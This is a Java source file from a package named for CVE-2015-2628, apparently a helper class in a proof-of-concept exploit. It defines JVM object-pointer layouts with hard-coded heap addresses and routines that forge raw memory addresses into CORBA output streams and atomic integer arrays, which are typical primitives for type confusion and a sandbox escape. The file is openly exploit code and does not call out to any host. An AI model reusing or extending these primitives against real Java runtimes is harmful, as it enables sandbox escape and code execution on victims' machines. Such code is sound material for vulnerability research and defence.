package poc.cve_2015_2628;

import java.util.concurrent.atomic.AtomicIntegerArray;

import org.omg.CORBA.TCKind;
import org.omg.CORBA.portable.OutputStream;

public enum OOP {

	OOP_32,
	OOP_COMPRESSED,
	OOP_64;
	
	
	public static OOP TYPE = OOP_64;
	
	public TCKind getTCKind( ) {
		switch( this ) {
		case OOP_COMPRESSED:
		case OOP_32:
			return TCKind.tk_long;
		case OOP_64:
			return TCKind.tk_longlong;
		}
		
		throw new AssertionError( "Invalid OOP Type: " + this );
	}
	
	public long getHeapStart( ) {
		switch( this ) {
		case OOP_32:
			return 0x0000000024800000l;
		case OOP_COMPRESSED:
			return 0x0000000641c00000l;
		case OOP_64:
			return 0x0000000080000000l;
		}
		throw new AssertionError( "Invalid OOP Type: " + this );
	}
	
	public void putAddress( OutputStream out, long addr ) {
		switch( this ) {
		case OOP_COMPRESSED:
			addr >>>= 3;
		case OOP_32:
			addr &= 0xFFFFFFFFl;
			out.write_long( ( int ) addr );
			break;
		case OOP_64:
			out.write_longlong( addr );
			break;
		}
	}
	
	public void putAddress( AtomicIntegerArray aia, int index, long addr ) {
		switch( this ) {
		case OOP_COMPRESSED:
			addr >>>= 3;
		case OOP_32:
			addr &= 0xFFFFFFFFl;
			aia.set( index, ( int ) addr );
			break;
		case OOP_64:
			int l = ( int ) ( ( addr >>> 00 ) & 0xFFFFFFFFl );
			int h = ( int ) ( ( addr >>> 32 ) & 0xFFFFFFFFl );
			
			aia.set( index + 0, l );
			aia.set( index + 1, h );
			
			break;
		}
		
	}
	
	public long getAddress( AtomicIntegerArray aia, int index ) {
		long addr = 0;
		
		switch( this ) {
		case OOP_COMPRESSED:
			addr = aia.get( index ) & 0xFFFFFFFFl;
			addr <<= 3;
			break;
		case OOP_32:
			addr = aia.get( index ) & 0xFFFFFFFFl;
			break;
		case OOP_64:
			index = index * 2;
			
			long l = aia.get( index + 0 ) & 0xFFFFFFFFl;
			long h = aia.get( index + 1 ) & 0xFFFFFFFFl;
			
			addr = ( h << 32 ) | l;
			break;
		}
		
		return addr;
	}
	
	public int getHeaderDif( ) {
		switch( this ) {
		case OOP_COMPRESSED:
		case OOP_32:
			return 4;
		case OOP_64:
			return 8;
		}
		
		throw new AssertionError( "Invalid OOP Type: " + this );
	}
}
